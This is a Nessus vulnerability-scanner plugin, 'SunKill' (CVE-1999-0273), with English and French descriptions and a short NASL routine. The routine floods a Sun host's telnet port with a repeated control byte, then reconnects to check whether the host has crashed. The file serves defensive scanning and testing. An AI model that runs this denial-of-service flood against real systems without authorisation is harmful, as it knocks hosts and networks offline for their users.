#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10272);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-1999-0273");
 
 name["english"] = "SunKill";
 name["francais"] = "SunKill";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to make the
remote Sun crash by flooding it with ^D characters
instead of entering our login.

This flaw allows an attacker to prevent
your network from working properly.


Solution : Upgrade your telnet server and filter
the incoming traffic to this port.

Risk factor : High";

 desc["francais"] = "Il s'est avéré possible de
faire planter la Sun distante en l'inondant
de caractères ^D à la place d'entrer un nom
de login.

Ce problème permet à un pirate d'empecher
votre réseau de fonctionner correctement.


Solution : Mettez à jour votre serveur telnet, et
filtrez le traffic entrant vers ce port.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote Sun";
 summary["francais"] = "Plante la Sun distante";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "wingate.nasl");
 script_exclude_keys("wingate/enabled");
 script_require_ports(23, "Services/telnet");
 exit(0);
}

#
# The script code starts here
#

# Wingate doesnt establish properly the telnet
# session, so if we know that we are facing it,
# we go away

include('telnet_func.inc');
wingate = get_kb_item("wingate/enabled");
if(wingate)exit(0);

port = get_kb_item("Services/telnet");
if(!port)port = 23;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  c = telnet_negotiate(socket:soc);
  d = raw_string(0x255);
  data = crap(length:2550, data:d);
  send(socket:soc, data:data);
  close(soc);
  soc2 = open_sock_tcp(port);
  if(!soc2){
  	set_kb_item(name:"Host/dead", value:TRUE);
	security_hole(port);
	}
  else close(soc2);
  }
}
